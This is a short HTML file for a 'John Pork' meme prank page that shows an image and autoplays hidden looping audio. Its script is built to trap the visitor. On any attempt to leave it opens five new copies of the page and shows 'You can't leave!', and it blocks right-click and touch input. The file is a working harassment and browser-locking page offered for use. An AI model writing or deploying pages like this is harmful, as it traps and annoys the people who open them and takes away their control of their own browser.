<!-- johnpork.html -->
<!DOCTYPE html><html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>John Pork</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            background-color: black;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
        img {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%); width: 80%;
            max-width: 300px;
        }
        #audio {
            display: none;
        }
    </style>
</head>
<body>
    <img src="https://th.bing.com/th/id/OIP.hGqGfvoqvtAkSImoB1ajEwHaNl?w=132&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="John Pork"> <audio id="audio" autoplay loop>
        <source src="https://example.com/johnpork.mp3" type="audio/mpeg">
    </audio>
    <script>
        // Prevent closing (spam new tabs if user tries to exit)
        window.onbeforeunload = function() {
            for (let i = 0; i < 5; i++) {                window.open(window.location.href, '_blank');            }
            return "You can't leave!";        };        // Prevent right-click, touch events, etc.
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('touchstart', e => e.preventDefault(), { passive: false }); </script>
</body>
</html>
